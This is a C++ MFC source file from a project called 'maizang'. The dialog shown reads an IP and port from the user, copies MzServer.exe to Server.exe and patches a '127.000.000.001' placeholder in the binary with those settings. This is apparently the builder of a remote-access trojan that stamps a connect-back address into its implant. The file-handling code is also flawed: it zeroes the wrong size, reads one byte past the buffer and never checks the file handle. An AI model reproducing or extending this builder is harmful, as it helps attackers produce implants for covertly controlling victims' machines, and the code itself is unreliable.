// SettingDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "maizang.h"
#include "SettingDlg.h"
#include "ConnectInfo.h"
#include "afxdialogex.h"


// CSettingDlg 对话框

IMPLEMENT_DYNAMIC(CSettingDlg, CDialogEx)

CSettingDlg::CSettingDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CSettingDlg::IDD, pParent)
	, connectIp(_T(""))
	, connectPort(0)
{

}

CSettingDlg::~CSettingDlg()
{
}

void CSettingDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_IP, connectIp);
	DDX_Text(pDX, IDC_Port, connectPort);
}


BEGIN_MESSAGE_MAP(CSettingDlg, CDialogEx)
	ON_BN_CLICKED(IDC_GenerateServer, &CSettingDlg::OnBnClickedGenerateserver)
END_MESSAGE_MAP()




int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
		if (j == da) return i;   
	}   
	return -1;   
}

// CSettingDlg 消息处理程序

void CSettingDlg::OnBnClickedGenerateserver()
{
	// TODO: 在此添加控件通知处理程序代码
	if (GetFileAttributes("MzServer.exe")==-1)
	{
		MessageBox("配置文件MzServer.exe不存在","呵呵哒",MB_OK|MB_ICONSTOP);
		return;
	}
	UpdateData(true);
	if(connectIp =="" || connectPort == 0){
		MessageBox("ip以及端口号设置出错！","呵呵哒！",MB_OK|MB_ICONSTOP);
		return;
	}	
	DeleteFile("Server.exe");
	CopyFile("MzServer.exe", "Server.exe", FALSE);
	strcpy(ConnectInfo::getConnectInfo()->ipAddress, connectIp);
	ConnectInfo::getConnectInfo()->port = connectPort;

	DWORD wr=0;
	HANDLE hFile=CreateFile("Server.exe",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	DWORD len=GetFileSize(hFile,NULL);
	char *str=new char [len];
	ZeroMemory(str,sizeof(str));
	ReadFile(hFile,str,len+1,&wr,NULL);
	CloseHandle(hFile);
	CString string = str;
	DWORD dwOffset = memfind(str,"127.000.000.001",len, 0);
	//long dwOffset = string.Find("127.0.0.1",0);
	if (dwOffset == -1)
	{
		AfxMessageBox("文件不合法");
		return;
	}
	CFile file;
	if(file.Open ("Server.exe", CFile::modeCreate | CFile::modeWrite))
	{
		try
		{
			file.Write(str, len);
			file.Seek(dwOffset, CFile::begin);
			ConnectInfo *p = ConnectInfo::getConnectInfo();
			file.Write(ConnectInfo::getConnectInfo(), sizeof(ConnectInfo));
			file.Close();
		}
		catch(...)
		{
			MessageBox("文件保存失败，请检查","提示",MB_OK|MB_ICONSTOP);
			DeleteFile("Server.exe");
			return;
		}
	}
	MessageBox("服务端文件生成成功,已保存为Server.exe","提示",MB_ICONWARNING);
}

